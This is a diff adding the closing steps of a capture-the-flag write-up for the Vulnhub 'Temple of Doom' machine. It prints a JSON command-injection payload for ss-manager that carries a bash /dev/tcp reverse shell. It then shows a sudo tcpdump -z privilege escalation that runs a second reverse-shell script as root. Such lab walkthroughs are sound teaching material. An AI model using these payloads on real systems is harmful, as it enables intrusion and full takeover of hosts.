@@ -158,3 +158,32 @@ A process called **ss-manager** is running as user **fireman**.
 
 >The configuration file on the file system or the JSON configuration received via UDP request is parsed and the arguments are passed to the "add_server" function. The function calls "construct_command_line(manager, server);" which returns a string from the parsed configuration. The string gets executed at line 486 "if (system(cmd) == -1) {", so if a configuration parameter contains "||evil command&&" within the "method" parameter, the evil command will get executed.
 
+* **ss-manager** listens on port **8839** by default and you can confirm it by running `netstat -altupn`.
+* Let's test the exploit by creating a file called **_jsonexploit_** in our machine and writing the following inside
+  ```json
+  add: {"server_port":8003, "password":"test", "method":"||bash -i >& /dev/tcp/10.0.2.15/1337 0>&1||"}
+  ```
+which will return a reverse shell to us on port **1337**.
+* Get the **jsonexploit** file on the vulnerable machine, using the same method we moved the **LinEnum** script.
+* Start a listening session on kali with `nc -lvnp 1337` and execute `nc 127.0.0.1 8839 <jsonexploit` on the **templeofdoom** machine.
+
+<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Temple%20of%20Doom/images/firemanlogin.jpg">
+
+* ### We see that we have succesfully logged in as user **fireman**.
+
+* Let's check what **fireman** can run as **root** with `sudo -l`
+
+<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Temple%20of%20Doom/images/sudol.jpg">
+
+* Referring to <a href="https://gtfobins.github.io/">GTFObins</a>, we see that we can use **tcpdump** to our advantage and execute commands as **root!**.
+
+* Create a script called **rootshell.sh** in `/tmp/` in current shell, put `bash -i >& /dev/tcp/10.0.2.15/4444 0>&1` inside it, `chmod +x /tmp/rootshell.sh` it and start a listening session on port **4444** on your Kali machine.
+
+* Now run `sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/rootshell.sh -Z root` as user **fireman**.
+* Checking our session on port **4444**, reveals we have succesfully gained a **root shell!**.
+
+<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Temple%20of%20Doom/images/slast.jpg">
+
+## Flag  
+
+<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Temple%20of%20Doom/images/last.jpg">
